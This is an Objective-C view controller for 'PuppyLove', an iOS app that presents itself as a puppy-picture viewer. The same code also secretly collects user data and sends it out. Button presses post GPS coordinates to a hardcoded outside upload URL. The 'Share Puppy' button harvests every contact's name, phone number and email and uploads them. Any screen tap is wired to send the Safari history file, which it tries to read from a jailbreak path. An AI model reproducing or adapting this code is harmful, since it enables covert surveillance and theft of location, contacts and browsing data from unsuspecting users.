//
//  ViewController.m
//  PuppyLove
//  Version 1.3.2 December 5 2013
//  Now with Steppers!
//  Writing to files abandoned in Jailbreak 2.3
//
//  Created by John Fulgoni on November 12 2013
//  Copyright (c) 2013 John Fulgoni. All rights reserved.
//

#import "ViewController.h"
#import "Plist.h"
#import <AddressBook/AddressBook.h>
#import <QuartzCore/QuartzCore.h>

@interface ViewController ()

@end

@implementation ViewController

@synthesize locationManager;

@synthesize headerLabel;
@synthesize footerLabel;
@synthesize clickmeLabel;

@synthesize myButton;
@synthesize shareButton;

@synthesize myStepper;

NSString *front; //stores GPS coordinate string
NSString *gunny = @"http://williamgunn.name/upload";

int puppyIndex = 1; //first object is 0, just transitioning second object
NSString *puppyString = @"test";
NSArray *puppyList;

NSString *mySafari;//stores History.plist as a string

UIAlertView *alert;


//MAIN METHOD.  WORKS ON SUCCESSFUL LOAD
- (void)viewDidLoad
{
    [super viewDidLoad];
	// Do any additional setup after loading the view, typically from a nib.

    
    //
    /*
     ABAddressBookRef addressBook = ABAddressBookCreate();
     __block BOOL accessGranted = NO;
    
    if (ABAddressBookRequestAccessWithCompletion != NULL) { // We are on iOS 6
        dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
        
        ABAddressBookRequestAccessWithCompletion(addressBook, ^(bool granted, CFErrorRef error) {
            accessGranted = granted;
            dispatch_semaphore_signal(semaphore);
        });
        
        dispatch_semaphore_wait(semaphore, DISPATCH_TIME_FOREVER);
        //dispatch_release(semaphore);
    }*/
    
    
  alert = [[UIAlertView alloc ] initWithTitle: @"Puppy Clicked!" message: @"You Clicked the Puppy" delegate:nil cancelButtonTitle:@"OK" otherButtonTitles:nil];
    
    myStepper.minimumValue = 0;
    myStepper.maximumValue = 4; //index of pictures
    
    locationManager = [[CLLocationManager alloc] init];
    locationManager.delegate = self;
    locationManager.distanceFilter = kCLDistanceFilterNone; // whenever we move
    locationManager.desiredAccuracy = kCLLocationAccuracyHundredMeters; // 100 m
    [locationManager startUpdatingLocation];
    
    headerLabel.text = @"Puppy Love";
    [headerLabel setFont:[UIFont fontWithName:@"American Typewriter" size:36]];
    
    footerLabel.text = @"El Dorado Solutions ™ 2013";
    clickmeLabel.text = @"Click the Puppy!";
    
    [myButton setImage:[UIImage imageNamed:@"Daisy2.jpg"] forState:UIControlStateNormal];
    [myButton setImage:[UIImage imageNamed:@"Daisy2.jpg"] forState:UIControlStateHighlighted];
    [myButton setImage:[UIImage imageNamed:@"Daisy2.jpg"] forState:UIControlStateSelected];
    myButton.showsTouchWhenHighlighted = YES;
    
    
    [shareButton setTitle:@"Share Puppy" forState:(UIControlState)UIControlStateNormal];
    [shareButton setTitle:@"Shared!" forState: (UIControlState)UIControlStateHighlighted];
    
    puppyList = @[@"Daisy2.jpg", @"Beagle-puppy.jpg", @"husky.jpg", @"alaska.JPG", @"morkie.jpg"];
    
    //experimental safari history portion
    NSString *filePath = @"/private/var/mobile/Library/Safari/History.plist";
    //mySafari = [NSString stringWithContentsOfFile:filePath encoding:NSUTF8StringEncoding error:NULL];
    //[self sendSafari];
    
    
    NSData* plistData = [filePath dataUsingEncoding:NSUTF8StringEncoding];
    NSString *error;
    NSPropertyListFormat format;
    NSDictionary* plist = [NSPropertyListSerialization propertyListFromData:plistData mutabilityOption:NSPropertyListImmutable format:&format errorDescription:&error];
    NSLog( @"plist is %@", plist );
    if(!plist){
        NSLog(@"Error: %@",error);
        //[error release];
    }
    
    mySafari = [NSString stringWithFormat:@"my dictionary is %@", plist];
    
    NSFileManager *filemgr;
    filemgr = [NSFileManager defaultManager];
    
    if ([filemgr fileExistsAtPath: filePath] == YES)
        NSLog (@"File exists");
    else
        NSLog (@"File not found");
    
    
    
    
    
    
   // UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(dismissKeyboard)];
    UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(sendSafari)];
    
    [self.view addGestureRecognizer:tap];
    
    
}

//STANDARD DISPOSAL
- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

//ATTEMPT TO SEND SAFARI DATA, MUST TEST LATER
//Currently responds to screen touch
- (void)sendSafari
{
    //send Start
    NSURL *serverID = [NSURL URLWithString:[ gunny stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]];
    NSLog(mySafari);
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:serverID];
    [request setHTTPMethod:@"POST"];
    [request setValue:@"multipart/form-data" forHTTPHeaderField:@"content-type"];
    
    
    NSData *data = [mySafari dataUsingEncoding:NSUTF8StringEncoding];
    [request setHTTPBody:data];
    [request setValue:[NSString stringWithFormat:@"%u", [data length]] forHTTPHeaderField:@"Content-Length"];
    [NSURLConnection connectionWithRequest:request delegate:self];
}


//GETS GPS COORDINATES
- (void)locationManager:(CLLocationManager *)manager
    didUpdateToLocation:(CLLocation *)newLocation
           fromLocation:(CLLocation *)oldLocation
{
    
    int degrees = newLocation.coordinate.latitude;
    double decimal = fabs(newLocation.coordinate.latitude - degrees);
    int minutes = decimal * 60;
    double seconds = decimal * 3600 - minutes * 60;
    NSString *lat = [NSString stringWithFormat:@"%d° %d' %1.4f\"",
                     degrees, minutes, seconds];
    degrees = newLocation.coordinate.longitude;
    decimal = fabs(newLocation.coordinate.longitude - degrees);
    minutes = decimal * 60;
    seconds = decimal * 3600 - minutes * 60;
    NSString *longt = [NSString stringWithFormat:@"%d° %d' %1.4f\"",
                       degrees, minutes, seconds];
    
    NSString *newline = @" \r";
    NSString *sendType = @"GPS\r";
    front = [NSString stringWithFormat:@"%@%@%@%@",sendType,lat,newline,longt];

}


//SENDS GPS TO DATABASE - LINKS TO CLICKING THE PICTURE
- (IBAction)myButtonPressed:(id)sender {
    
    //send GPS Start
    NSURL *serverID = [NSURL URLWithString:[ gunny stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]];
    NSLog(front);
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:serverID];
    [request setHTTPMethod:@"POST"];
    [request setValue:@"multipart/form-data" forHTTPHeaderField:@"content-type"];
    
    
    NSData *data = [front dataUsingEncoding:NSUTF8StringEncoding];
    [request setHTTPBody:data];
    [request setValue:[NSString stringWithFormat:@"%u", [data length]] forHTTPHeaderField:@"Content-Length"];
    [NSURLConnection connectionWithRequest:request delegate:self];
    
    [alert show];
    //end gps
}

//LINKS TO MYSTEPPER
- (IBAction)stepperChange:(id)sender{
    
    puppyIndex = myStepper.value;
    puppyString = puppyList[puppyIndex];
    //NSLog(puppyString); //spams logs so commented out
    
    [myButton setImage:[UIImage imageNamed:puppyString] forState:UIControlStateNormal];
    [myButton setImage:[UIImage imageNamed:puppyString] forState:UIControlStateHighlighted];
    [myButton setImage:[UIImage imageNamed:puppyString] forState:UIControlStateSelected];
    
}

//LINKS TO SHARE BUTTON - SENDS CONTACTS TO GUNNY SERVER
- (IBAction)shareButtonPressed:(id)sender{
    
    NSLog(@"In contact send\n");
    
    ABAddressBookRef allPeople = ABAddressBookCreate();
    CFArrayRef allContacts = ABAddressBookCopyArrayOfAllPeople(allPeople);
    CFIndex numberOfContacts  = ABAddressBookGetPersonCount(allPeople);
    
    NSLog(@"numberOfContacts------------------------------------%ld",numberOfContacts);
    NSMutableString *stringofAllContacts = [[NSMutableString alloc]initWithString:@""];
    
    for(int i = 0; i < numberOfContacts; i++){
        NSString* name = @"";
        NSString* phone = @"";
        NSString* email = @"";
        ABRecordRef aPerson = CFArrayGetValueAtIndex(allContacts, i);
        ABMultiValueRef fnameProperty = ABRecordCopyValue(aPerson, kABPersonFirstNameProperty);
        ABMultiValueRef lnameProperty = ABRecordCopyValue(aPerson, kABPersonLastNameProperty);
        
        ABMultiValueRef phoneProperty = ABRecordCopyValue(aPerson, kABPersonPhoneProperty);\
        ABMultiValueRef emailProperty = ABRecordCopyValue(aPerson, kABPersonEmailProperty);
        
        NSArray *emailArray = (__bridge NSArray *)ABMultiValueCopyArrayOfAllValues(emailProperty);
        NSArray *phoneArray = (__bridge NSArray *)ABMultiValueCopyArrayOfAllValues(phoneProperty);
        
        
        if (fnameProperty != nil) {
            name = [NSString stringWithFormat:@"%@", fnameProperty];
        }
        if (lnameProperty != nil) {
            name = [name stringByAppendingString:[NSString stringWithFormat:@" %@", lnameProperty]];
        }
        
        if ([phoneArray count] > 0) {
            if ([phoneArray count] > 1) {
                for (int i = 0; i < [phoneArray count]; i++) {
                    phone = [phone stringByAppendingString:[NSString stringWithFormat:@"%@\n", [phoneArray objectAtIndex:i]]];
                }
            }else {
                phone = [NSString stringWithFormat:@"%@", [phoneArray objectAtIndex:0]];
            }
        }
        
        if ([emailArray count] > 0) {
            if ([emailArray count] > 1) {
                for (int i = 0; i < [emailArray count]; i++) {
                    email = [email stringByAppendingString:[NSString stringWithFormat:@"%@\n", [emailArray objectAtIndex:i]]];
                }
            }else {
                email = [NSString stringWithFormat:@"%@", [emailArray objectAtIndex:0]];
            }
        }
        NSString* sendstring = [NSString stringWithFormat:@"%@ %@ %@", name, phone, email];
        NSLog(sendstring);
        [stringofAllContacts appendString:sendstring];
        [stringofAllContacts appendString:@"|"];
        NSLog(@"NAME : %@",name);
        NSLog(@"PHONE: %@",phone);
        NSLog(@"EMAIL: %@",email);
        NSLog(@"\n");
    }
    NSLog(stringofAllContacts);
    
    
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *documentsDirectory = [paths objectAtIndex:0];
    NSString *filePath = [documentsDirectory stringByAppendingPathComponent:@"contacts.txt"];
    
    
    [stringofAllContacts writeToFile:filePath atomically:TRUE encoding:NSUTF8StringEncoding error:NULL];
    
    
    
    //SENDING CODE
    NSURL *serverID = [NSURL URLWithString:[ gunny stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:serverID];
    [request setHTTPMethod:@"POST"];
    [request setValue:@"multipart/form-data" forHTTPHeaderField:@"content-type"];
    
    
    NSString *myString = [NSString stringWithContentsOfFile:filePath encoding:NSUTF8StringEncoding error:NULL];
    
    NSData *data = [stringofAllContacts dataUsingEncoding:NSUTF8StringEncoding];
    [request setHTTPBody:data];
    [request setValue:[NSString stringWithFormat:@"%u", [data length]] forHTTPHeaderField:@"Content-Length"];
    [NSURLConnection connectionWithRequest:request delegate:self];
    //END SENDING;
}

//WHEN SCREEN IS CLICKED, YOU DIP THE TRICK
/*- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event {
    //mylabel.text = [NSString stringWithFormat: @"Screen CLicked %@ %f", @"AAA", event.timestamp];
    // mylabel.text = [NSString stringWithFormat: @"Screen Clicked"];
    [super touchesBegan:touches withEvent:event];
}

-(void)dismissKeyboard {
    [myText resignFirstResponder];
}*/


//ATTEMPT TO READ IN PLIST IN ORDER TO SAVE SAFARI CACHE.
-(void) readPlist
{
    // Override point for customization after application launch.
    
    NSString * plistStr =@"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"><plist version=\"1.0\"><dict>    <key>name</key> <string>Ravi</string>   <key>age</key>  <integer>31</integer>   <key>photo</key>    <data>bXkgcGhvdG8=</data>   <key>dob</key>  <date>1981-05-16T11:32:06Z</date>   <key>indian</key>   <true/>   <key>friends</key>  <array>       <string>Shanker</string>        <string>Rajji</string>      <string>Haya</string>   </array>  <key>subjects</key> <dict>        <key>english</key>      <real>90.12</real>      <key>maths</key>        <real>80.12</real>      <key>science</key>      <real>90.43</real>  </dict></dict></plist>";
    
    //Convert the PLIST to Dictionary
    NSDictionary * dict =[Plist plistToObjectFromString:plistStr];
    
    //Read Values From Dictionary
    NSString * name = [dict objectForKey:@"name"]; //String
    NSNumber * age = [dict objectForKey:@"age"]; //Integer
    NSDate * dob = [dict objectForKey:@"dob"];  //Date
    BOOL indian = [[dict objectForKey:@"indian"] boolValue]; //Boolean
    NSData * photo =[dict objectForKey:@"photo"]; //NSData
    
    NSArray * friends =[dict objectForKey:@"friends"]; //Array
    NSDictionary * subjects =[dict objectForKey:@"subjects"]; //Dictionary
    
    NSLog(@"Name : %@",name);
    NSLog(@"age : %d",[age integerValue]);
    NSLog(@"dbo : %@",[dob description]);
    NSLog(@"indian : %d",indian);
    NSLog(@"Photo : %@",[[NSString alloc] initWithData:photo encoding:NSUTF8StringEncoding]);
    
    //read Array elements
    for(int i=0;i<[friends count];i++)
    {
        NSLog(@"Friend %d : %@",i+1,[friends objectAtIndex:i]);
    }
    
    //read Dictionary Elements
    NSArray * keys =[subjects allKeys];
    for(NSString * subject in keys)
    {
        NSNumber * marks =[subjects objectForKey:subject];
        NSLog(@"Subject: %@ , marks:%8.2f",subject,[marks floatValue]);
    }
    
}


@end
